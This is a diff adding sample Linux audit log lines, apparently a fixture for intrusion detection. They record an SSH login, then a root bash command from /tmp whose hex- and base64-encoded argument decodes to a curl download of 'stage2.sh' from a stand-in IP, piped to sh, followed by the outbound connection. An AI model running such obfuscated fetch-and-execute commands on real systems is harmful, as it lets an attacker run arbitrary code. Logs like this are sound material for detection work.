@@ -1,0 +1,11 @@
+type=USER_LOGIN msg=audit(1791429267.412:1201): pid=930 uid=0 auid=1001 ses=7 msg='op=login id=1001 exe="/usr/sbin/sshd" hostname=203.0.113.77 addr=203.0.113.77 terminal=/dev/pts/1 res=success'
+type=SYSCALL msg=audit(1791429397.101:1210): arch=c000003e syscall=59 success=yes exit=0 a0=55d0c1 a1=55d0c2 a2=55d0c3 a3=8 items=2 ppid=931 pid=1040 auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=7 comm="ls" exe="/usr/bin/ls" key="exec_log"
+type=EXECVE msg=audit(1791429397.101:1210): argc=2 a0="ls" a1="-la"
+type=CWD msg=audit(1791429397.101:1210): cwd="/home/deploy"
+type=PROCTITLE msg=audit(1791429397.101:1210): proctitle=6C73002D6C61
+type=SYSCALL msg=audit(1791429406.530:1214): arch=c000003e syscall=59 success=yes exit=0 a0=55d0c1 a1=55d0c2 a2=55d0c3 a3=8 items=2 ppid=931 pid=1047 auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=7 comm="bash" exe="/usr/bin/bash" key="susp_exec"
+type=EXECVE msg=audit(1791429406.530:1214): argc=3 a0="bash" a1="-c" a2=6563686F2059335679624341746379426F644852774F6938764D546B344C6A55784C6A45774D4334354C334E305957646C4D69357A6143423849484E6F207C20626173653634202D64207C207368
+type=CWD msg=audit(1791429406.530:1214): cwd="/tmp"
+type=PROCTITLE msg=audit(1791429406.530:1214): proctitle=62617368002D63006563686F2059335679624341746379426F644852774F6938764D546B344C6A55784C6A45774D4334354C334E305957646C4D69357A6143423849484E6F207C20626173653634202D64207C207368
+type=SYSCALL msg=audit(1791429407.002:1215): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7ffd0 a2=10 a3=0 items=0 ppid=1047 pid=1049 auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=7 comm="curl" exe="/usr/bin/curl" key="net_out"
+type=SOCKADDR msg=audit(1791429407.002:1215): saddr=02000050C63364090000000000000000
